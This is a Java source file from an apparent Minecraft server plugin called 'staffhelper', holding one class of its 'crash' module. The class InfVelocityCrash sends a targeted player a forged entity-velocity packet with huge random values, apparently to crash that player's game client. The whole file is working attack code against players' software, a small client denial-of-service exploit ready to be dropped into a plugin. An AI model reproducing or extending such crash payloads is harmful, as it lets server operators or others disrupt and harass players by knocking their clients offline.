package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityVelocity;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import dev.xnlawa.staffhelper.packet.WrapperPlayServerEntityVelocityCrash;
import dev.xnlawa.staffhelper.util.RandomUtil;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

public class InfVelocityCrash extends Crash {
    public InfVelocityCrash() {
        super(CrashMethod.INFVELOCITY);
    }

    @Override
    public void performCrash(Player player) {
        Vector3d velocity = new Vector3d(
                99999999d * RandomUtil.nextDouble(0.2,0.4),
                99999999d * RandomUtil.nextDouble(0.2,0.4),
                99999999d * RandomUtil.nextDouble(0.2,0.4));
        WrapperPlayServerEntityVelocity packet = new WrapperPlayServerEntityVelocity(player.getEntityId(), velocity);
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
    }
}
